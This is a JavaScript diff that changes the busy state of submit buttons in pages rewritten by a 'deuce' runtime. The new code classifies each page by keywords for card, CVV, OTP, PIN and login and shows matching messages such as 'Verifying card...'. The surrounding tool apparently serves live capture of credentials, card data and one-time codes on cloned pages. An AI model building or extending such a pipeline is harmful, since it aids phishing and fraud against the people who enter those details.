@@ -570,16 +570,36 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     return /submit|login|log in|sign in|signin|continue|next|verify|confirm|proceed|send|validate|complete|enter/.test(text);
   }
 
+  function waitingMessage(control) {
+    const text = [
+      pageLabel(),
+      runtime.pageId,
+      document.title,
+      control && control.textContent,
+      control && control.value,
+      control && control.id,
+      control && control.name
+    ].filter(Boolean).join(" ").toLowerCase();
+    if (/card|credit|debit|cvv|cvc|expiry|payment/.test(text)) return "Verifying card...";
+    if (/otp|one.?time|verification code|security code|sms|auth code/.test(text)) return "Verifying code...";
+    if (/\bpin\b|passcode/.test(text)) return "Verifying PIN...";
+    if (/personal|profile|address|information|details/.test(text)) return "Submitting...";
+    if (/success|complete|finish|redirect/.test(text)) return "Redirecting...";
+    if (/login|log in|sign in|signin|password|username|email/.test(text)) return "Signing in...";
+    return "Processing...";
+  }
+
   function setControlWaiting(control) {
     if (!control) return;
     if (!control.dataset.deuceOriginalText) control.dataset.deuceOriginalText = control.value || control.textContent || "Submit";
     control.disabled = true;
     control.setAttribute("aria-busy", "true");
     control.classList.add("deuce-runtime-waiting");
+    const message = waitingMessage(control);
     if (control.tagName === "INPUT") {
-      control.value = "Waiting...";
+      control.value = message;
     } else if ("textContent" in control) {
-      control.textContent = "Waiting...";
+      control.textContent = message;
     }
   }
 
@@ -691,10 +711,11 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
       button.disabled = true;
       button.setAttribute("aria-busy", "true");
       button.classList.add("deuce-runtime-waiting");
+      const message = waitingMessage(button);
       if (button.tagName === "INPUT") {
-        button.value = "Waiting...";
+        button.value = message;
       } else {
-        button.textContent = "Waiting...";
+        button.textContent = message;
       }
     });
   }
